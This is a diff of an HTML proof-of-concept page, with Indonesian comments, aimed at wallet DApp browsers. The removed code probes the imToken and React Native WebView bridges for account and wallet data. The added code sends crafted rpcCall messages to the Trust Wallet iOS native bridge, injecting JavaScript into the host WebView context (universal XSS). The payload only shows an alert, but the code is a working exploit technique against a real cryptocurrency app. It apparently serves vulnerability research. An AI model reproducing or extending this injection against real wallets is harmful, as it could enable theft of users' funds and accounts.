@@ -1,124 +1,37 @@
-<!DOCTYPE html>
-<html>
-<body>
-<button onclick="scan()">Deep Scan</button>
-<pre id="result">...</pre>
-
+<!doctype html>
+<html lang="id"><head><meta charset="utf-8">
+<title>Trust Wallet iOS UXSS — dummy PoC</title></head><body>
+<a id="run" href="https://google.com/">RUN</a>
+<pre id="status">dummy PoC</pre>
 <script>
-async function scan() {
-  const r = document.getElementById('result');
-  let out = '';
+'use strict';
+const runLink = document.querySelector('#run');
+const status  = document.querySelector('#status');
+const target  = 'https://google.com/';
 
-  // 1. ReactNativeWebView - PALING MENARIK!
-  out += '=== ReactNativeWebView ===\n';
-  try {
-    const rnwv = window.ReactNativeWebView;
-    out += 'Keys: ' + Object.keys(rnwv).join(', ') + '\n';
-    
-    // Coba postMessage ke React Native
-    try {
-      rnwv.postMessage(JSON.stringify({
-        type: 'test',
-        payload: 'hello'
-      }));
-      out += '✅ postMessage sent!\n';
-    } catch(e) {
-      out += 'postMessage error: ' + e.message + '\n';
-    }
-  } catch(e) {
-    out += 'Error: ' + e.message + '\n';
+// Payload dummy: HANYA buktikan origin. Tanpa wallet, tanpa sign, tanpa transfer.
+const impact = [
+  '(async()=>{',
+  String.raw`if(!/(^|\.)google\.com$/.test(location.hostname))return;`,
+  'if(window.__twUxss)return;window.__twUxss=1;',
+  "document.body?.insertAdjacentHTML('afterbegin','<h1 id=tw-uxss>UXSS PoC: JS executed in host WebView context</h1>');",
+  'alert(document.domain);',   // tampil "google.com" saat boundary bobol
+  '})();'
+].join(' ');
+
+const marker = `zz_");${impact}//`;
+runLink.addEventListener('click', e => {
+  e.preventDefault();
+  const bridge = window.webkit?.messageHandlers?._tw_;
+  if(!bridge?.postMessage || !window.trustwallet?.ethereum){
+    status.textContent='Buka di DApp browser Trust Wallet iOS 26.38.20.';return;
   }
-
-  // 2. imToken.callAPI - SANGAT MENARIK!
-  out += '\n=== imToken.callAPI ===\n';
-  try {
-    const apis = [
-      'getAccounts', 'getAddress', 'getWallet',
-      'eth_accounts', 'eth_requestAccounts',
-      'wallet_getInfo', 'wallet_accounts',
-      'getUserInfo', 'getBalance',
-      'navigation.goBack', 'user.info',
-      'device.getInfo', 'app.getVersion'
-    ];
-
-    for (const api of apis) {
-      try {
-        const result = await new Promise((resolve, reject) => {
-          window.imToken.callAPI(api, {}, 
-            (err, data) => err ? reject(err) : resolve(data)
-          );
-          setTimeout(() => resolve('timeout'), 1000);
-        });
-        out += `${api}: ${JSON.stringify(result)}\n`;
-      } catch(e) {
-        out += `${api}: error - ${e.message}\n`;
-      }
-    }
-  } catch(e) {
-    out += 'Error: ' + e.message + '\n';
+  const baseId = Math.trunc(Date.now()%9e15);
+  for(let i=0;i<8;i++){
+    bridge.postMessage({id:baseId+i,network:'ethereum',name:'rpcCall',
+      object:{method:marker,params:[],jsonrpc:'2.0'}});
   }
-
-  // 3. imToken.postMessage
-  out += '\n=== imToken.postMessage ===\n';
-  try {
-    window.imToken.postMessage(
-      JSON.stringify({method: 'getAccounts', id: 1})
-    );
-    out += 'postMessage sent!\n';
-  } catch(e) {
-    out += 'Error: ' + e.message + '\n';
-  }
-
-  // 4. btcwallet
-  out += '\n=== btcwallet ===\n';
-  try {
-    const btc = window.btcwallet;
-    out += 'Keys: ' + Object.keys(btc).join(', ') + '\n';
-    
-    // Coba get BTC accounts
-    if (btc.getAccounts) {
-      const accs = await btc.getAccounts();
-      out += 'BTC accounts: ' + JSON.stringify(accs) + '\n';
-    }
-    if (btc.requestAccounts) {
-      const accs = await btc.requestAccounts();
-      out += 'BTC requestAccounts: ' + JSON.stringify(accs) + '\n';
-    }
-  } catch(e) {
-    out += 'Error: ' + e.message + '\n';
-  }
-
-  // 5. ImTokenEventEmitter
-  out += '\n=== ImTokenEventEmitter ===\n';
-  try {
-    const emitter = new window.ImTokenEventEmitter();
-    out += 'Keys: ' + Object.keys(emitter).join(', ') + '\n';
-  } catch(e) {
-    out += 'Error: ' + e.message + '\n';
-  }
-
-  // 6. ethereumProvider
-  out += '\n=== ethereumProvider ===\n';
-  try {
-    const ep = window.ethereumProvider;
-    out += 'Keys: ' + Object.keys(ep).join(', ') + '\n';
-    out += 'isImToken: ' + ep.isImToken + '\n';
-    
-    // Coba eth_accounts tanpa connect
-    const result = await ep.request({
-      method: 'eth_accounts'
-    });
-    out += 'eth_accounts: ' + JSON.stringify(result) + '\n';
-  } catch(e) {
-    out += 'Error: ' + e.message + '\n';
-  }
-
-  r.textContent = out;
-  try {
-    await navigator.clipboard.writeText(out);
-    r.textContent += '\n[Copied!]';
-  } catch(e) {}
-}
-</script>
-</body>
-</html>
+  status.textContent='RPC dikirim; navigasi ke '+target;
+  setTimeout(()=>location.assign(target),120);
+},{once:true});
+</script></body></html>
